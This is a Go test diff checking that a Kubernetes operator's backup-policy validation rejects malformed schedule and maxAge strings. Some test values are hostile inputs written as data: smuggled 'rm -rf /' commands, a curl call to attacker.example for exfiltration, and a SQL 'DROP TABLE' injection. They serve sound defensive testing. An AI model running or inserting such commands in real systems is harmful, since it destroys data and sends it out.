@@ -590,6 +590,125 @@ func assertAttachDetachRequest(t *testing.T, req webapimock.RecordedRequest, pat
 	}
 }
 
+// ---- validateBackupPolicySpec tests ----
+
+func TestValidateBackupPolicySpec(t *testing.T) {
+	tests := []struct {
+		name    string
+		spec    simplyblockv1alpha1.BackupPolicySpec
+		wantErr bool
+	}{
+		// valid — empty optional fields
+		{name: "empty fields", spec: simplyblockv1alpha1.BackupPolicySpec{}},
+		// valid schedules
+		{name: "schedule single pair minutes", spec: simplyblockv1alpha1.BackupPolicySpec{Schedule: "15m,4"}},
+		{name: "schedule single pair hours", spec: simplyblockv1alpha1.BackupPolicySpec{Schedule: "2h,3"}},
+		{name: "schedule single pair days", spec: simplyblockv1alpha1.BackupPolicySpec{Schedule: "1d,7"}},
+		{name: "schedule single pair weeks", spec: simplyblockv1alpha1.BackupPolicySpec{Schedule: "1w,2"}},
+		{name: "schedule multi pair", spec: simplyblockv1alpha1.BackupPolicySpec{Schedule: "15m,4 60m,11 24h,7"}},
+		// valid maxAge
+		{name: "maxAge minutes", spec: simplyblockv1alpha1.BackupPolicySpec{MaxAge: "30m"}},
+		{name: "maxAge hours", spec: simplyblockv1alpha1.BackupPolicySpec{MaxAge: "12h"}},
+		{name: "maxAge days", spec: simplyblockv1alpha1.BackupPolicySpec{MaxAge: "7d"}},
+		{name: "maxAge weeks", spec: simplyblockv1alpha1.BackupPolicySpec{MaxAge: "2w"}},
+		// invalid schedules
+		{name: "schedule @reboot macro", spec: simplyblockv1alpha1.BackupPolicySpec{Schedule: "@reboot"}, wantErr: true},
+		{name: "schedule shell injection semicolon", spec: simplyblockv1alpha1.BackupPolicySpec{Schedule: "15m,4; rm -rf /"}, wantErr: true},
+		{name: "schedule missing keep count", spec: simplyblockv1alpha1.BackupPolicySpec{Schedule: "15m"}, wantErr: true},
+		{name: "schedule invalid unit", spec: simplyblockv1alpha1.BackupPolicySpec{Schedule: "15s,4"}, wantErr: true},
+		{name: "schedule named macro", spec: simplyblockv1alpha1.BackupPolicySpec{Schedule: "@daily"}, wantErr: true},
+		// invalid maxAge
+		{name: "maxAge bad unit suffix", spec: simplyblockv1alpha1.BackupPolicySpec{MaxAge: "7x"}, wantErr: true},
+		{name: "maxAge shell injection", spec: simplyblockv1alpha1.BackupPolicySpec{MaxAge: "7d; rm -rf /"}, wantErr: true},
+		{name: "maxAge no leading digit", spec: simplyblockv1alpha1.BackupPolicySpec{MaxAge: "d"}, wantErr: true},
+		{name: "maxAge empty string unit only", spec: simplyblockv1alpha1.BackupPolicySpec{MaxAge: "h"}, wantErr: true},
+	}
+	for _, tc := range tests {
+		t.Run(tc.name, func(t *testing.T) {
+			msg := validateBackupPolicySpec(tc.spec)
+			if tc.wantErr && msg == "" {
+				t.Fatal("expected a validation error message, got none")
+			}
+			if !tc.wantErr && msg != "" {
+				t.Fatalf("expected no error, got %q", msg)
+			}
+		})
+	}
+}
+
+func TestBackupPolicyReconcileInvalidScheduleSetsFailed(t *testing.T) {
+	const policyName = "policy-bad-schedule"
+
+	policy := testBackupPolicyCR(policyName)
+	// Inject a malicious schedule string — must not reach the backend.
+	policy.Spec.Schedule = "@reboot; curl attacker.example/exfil"
+
+	r := newBackupPolicyTestReconciler(t, policy)
+
+	res, err := r.Reconcile(context.Background(), ctrl.Request{NamespacedName: client.ObjectKeyFromObject(policy)})
+	if err != nil {
+		t.Fatalf("reconcile returned unexpected error: %v", err)
+	}
+	if res.RequeueAfter != 0 {
+		t.Fatalf("expected terminal (no-requeue) result, got %+v", res)
+	}
+
+	current := getBackupPolicy(t, r.Client, policy)
+	if current.Status.Phase != simplyblockv1alpha1.BackupPolicyPhaseFailed {
+		t.Fatalf("expected phase %q, got %q", simplyblockv1alpha1.BackupPolicyPhaseFailed, current.Status.Phase)
+	}
+	if !strings.Contains(current.Status.Message, "invalid schedule") {
+		t.Fatalf("expected message to mention \"invalid schedule\", got %q", current.Status.Message)
+	}
+}
+
+func TestBackupPolicyReconcileInvalidMaxAgeSetsFailed(t *testing.T) {
+	const policyName = "policy-bad-maxage"
+
+	policy := testBackupPolicyCR(policyName)
+	// Inject a malicious maxAge string — must not reach the backend.
+	policy.Spec.MaxAge = "7d; DROP TABLE backups;--"
+
+	r := newBackupPolicyTestReconciler(t, policy)
+
+	res, err := r.Reconcile(context.Background(), ctrl.Request{NamespacedName: client.ObjectKeyFromObject(policy)})
+	if err != nil {
+		t.Fatalf("reconcile returned unexpected error: %v", err)
+	}
+	if res.RequeueAfter != 0 {
+		t.Fatalf("expected terminal (no-requeue) result, got %+v", res)
+	}
+
+	current := getBackupPolicy(t, r.Client, policy)
+	if current.Status.Phase != simplyblockv1alpha1.BackupPolicyPhaseFailed {
+		t.Fatalf("expected phase %q, got %q", simplyblockv1alpha1.BackupPolicyPhaseFailed, current.Status.Phase)
+	}
+	if !strings.Contains(current.Status.Message, "invalid maxAge") {
+		t.Fatalf("expected message to mention \"invalid maxAge\", got %q", current.Status.Message)
+	}
+}
+
+func TestBackupPolicyReconcileInvalidSpecMakesNoBackendCalls(t *testing.T) {
+	const policyName = "policy-bad-no-api"
+
+	policy := testBackupPolicyCR(policyName)
+	policy.Spec.Schedule = "*/5 * * * *" // cron-style — not our format
+
+	// Deliberately provide no mock server — any backend call would panic or
+	// fail with a connection error, proving the validation short-circuits first.
+	r := newBackupPolicyTestReconciler(t, policy)
+
+	_, err := r.Reconcile(context.Background(), ctrl.Request{NamespacedName: client.ObjectKeyFromObject(policy)})
+	if err != nil {
+		t.Fatalf("reconcile returned unexpected error: %v", err)
+	}
+
+	current := getBackupPolicy(t, r.Client, policy)
+	if current.Status.Phase != simplyblockv1alpha1.BackupPolicyPhaseFailed {
+		t.Fatalf("expected Failed phase, got %q", current.Status.Phase)
+	}
+}
+
 func newBackupPolicyTestReconciler(t *testing.T, objects ...client.Object) *BackupPolicyReconciler {
 	t.Helper()
 
